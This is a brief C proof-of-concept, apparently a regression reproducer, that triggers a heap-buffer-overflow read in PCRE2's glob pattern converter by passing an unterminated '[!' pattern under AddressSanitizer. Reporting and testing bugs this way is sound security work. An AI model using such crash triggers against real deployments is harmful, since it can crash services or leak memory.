/* PoC: heap-buffer-overflow (read) in pcre2_pattern_convert() glob conversion.
 *
 * A glob pattern that ends immediately after the negation marker of a
 * character class ("[!" or "[^") drives convert_glob_parse_range() past the
 * end of the pattern buffer when GLOB_NO_WILD_SEPARATOR is used.
 *
 * The pattern is supplied as an explicit pointer+length (not NUL terminated),
 * which is a fully supported calling convention: when plength is not
 * PCRE2_ZERO_TERMINATED the converter must not read beyond pattern[plength-1].
 *
 * Built with -fsanitize=address, this aborts (rc 134) on the patched tree and
 * completes cleanly on the parent tree.
 */

#include <stdlib.h>
#include <string.h>

#define PCRE2_CODE_UNIT_WIDTH 8
#include "pcre2.h"

int main(void)
{
PCRE2_UCHAR *buffer = NULL;
PCRE2_SIZE blength = 0;
int rc;

/* Exact-size allocation so a one-past-the-end read is detectable. */
PCRE2_UCHAR *pattern = (PCRE2_UCHAR *)malloc(2);
pattern[0] = '[';
pattern[1] = '!';

rc = pcre2_pattern_convert(pattern, 2,
  PCRE2_CONVERT_GLOB | PCRE2_CONVERT_GLOB_NO_WILD_SEPARATOR,
  &buffer, &blength, NULL);

if (buffer != NULL) pcre2_converted_pattern_free(buffer);
free(pattern);
return rc;
}
